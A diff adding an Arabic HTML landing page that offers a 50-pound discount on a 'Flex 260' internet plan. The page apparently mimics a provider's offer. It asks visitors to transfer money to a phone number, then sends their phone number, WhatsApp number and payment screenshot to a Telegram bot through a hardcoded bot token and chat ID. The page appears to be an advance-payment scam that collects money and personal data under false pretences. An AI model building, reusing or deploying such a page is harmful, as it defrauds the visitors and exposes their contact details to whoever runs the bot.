@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wedoo Net - خصم 50 جنيه</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+        
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            text-align: center;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+      /* شريط العنوان */
+      .header {
+            background: linear-gradient(45deg, #ff512f, #dd2476);
+            padding: 20px;
+            font-size: 26px;
+            font-weight: bold;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-10px); }
+        }
+       /* قطرات المطر */
+ .rain-container {
+            position: fixed;
+            top: 100px;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            pointer-events: none;
+        }
+
+        .rain-drop {
+            position: absolute;
+            width: 2px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.6);
+            opacity: 0.7;
+            animation: fall linear infinite;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+        
+        .discount-box {
+            background: #ffcc00;
+            color: black;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            position: relative;
+            margin-top: 20px;
+            width: 90%;
+            max-width: 750px;
+            text-align: center;
+            border-radius: 30px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+            margin-top: 20px;
+            width: 90%;
+            max-width: 400px;
+            backdrop-filter: blur(10px);
+        }
+        
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 8px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            text-align: center;
+        }
+        
+        input {
+            background: rgba(255, 255, 255, 0.8);
+            color: black;
+            border: 1px solid #ccc;
+        }
+        
+        button {
+            background: #ff5722;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 4px 10px rgba(255, 87, 34, 0.3);
+        }
+        
+        button:hover {
+            background: #e64a19;
+            box-shadow: 0 6px 12px rgba(255, 87, 34, 0.5);
+        }
+        
+        .success-message {
+            background: #4CAF50;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+ <!-- تأثير المطر -->
+ <div class="rain-container"></div>
+    <div class="header">خصم فليكس 260     </div>
+
+
+    <div class="discount-box">
+        سعر الخصم: <strong>50 جنيه</strong> <br>
+        ⚡ لازم تبقي علي نظام فليكس 260 الخصم الي بينزلك 120 بدل 260          <br>
+        <strong>قم بتحويل المبلغ إلى وخد اسكرين بالتحويل : <strong>01097891442</strong></strong>
+    </div>
+
+    <div class="container">
+        <input type="text" id="phoneNumber" placeholder="أدخل رقم الهاتف للخصم" required>
+        <input type="text" id="whatsappNumber" placeholder="أدخل رقم واتساب للتواصل" required>
+        <input type="file" id="paymentScreenshot" accept="image/*" required>
+        <button onclick="submitRequest()">تقديم طلب الخصم</button>
+    </div>
+
+    <div class="success-message" id="successMessage">
+        تم تقديم طلب الخصم الخاص بك، سيتم التنفيذ خلال 30 دقيقة أو أقل.
+    </div>
+
+    <script>
+        function submitRequest() {
+            let phoneNumber = document.getElementById("phoneNumber").value;
+            let whatsappNumber = document.getElementById("whatsappNumber").value;
+            let paymentScreenshot = document.getElementById("paymentScreenshot").files[0];
+
+            if (!phoneNumber || !whatsappNumber || !paymentScreenshot) {
+                alert("يرجى ملء جميع الحقول ورفع صورة التحويل.");
+                return;
+            }
+
+            let token = "7916799067:AAHFnY6z26-uAOKOwSaG43OPgBo-EEdZ6OE";
+            let chatId = "6798744902";
+            let message = `📌 طلب خصم جديد:\n📞 رقم الهاتف: ${phoneNumber}\n📲 واتساب: ${whatsappNumber}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(() => {
+                    let formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("photo", paymentScreenshot);
+                    return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                })
+                .then(() => {
+                    document.getElementById("successMessage").style.display = "block";
+                })
+                .catch(error => {
+                    alert("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
+                });
+        }
+        function createRain() {
+            const rainContainer = document.querySelector('.rain-container');
+            for (let i = 0; i < 50; i++) {
+                let drop = document.createElement('div');
+                drop.classList.add('rain-drop');
+                drop.style.left = `${Math.random() * 100}%`;
+                drop.style.animationDuration = `${Math.random() * 2 + 1}s`;
+                drop.style.animationDelay = `${Math.random() * 2}s`;
+                rainContainer.appendChild(drop);
+            }
+        }
+        createRain();
+    </script>
+</body>
+</html>
